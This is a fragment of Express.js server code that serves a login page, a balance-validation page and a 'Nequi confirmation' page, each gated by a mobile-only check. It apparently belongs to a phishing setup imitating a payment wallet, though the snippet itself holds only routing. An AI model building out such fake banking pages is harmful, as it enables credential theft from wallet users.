...
// Serve static assets with logging - Important for Render/Local
...
app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login_final.html'));
});

app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'validacion_saldo.html'));
});

app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'confirmacion_nequi.html'));
});
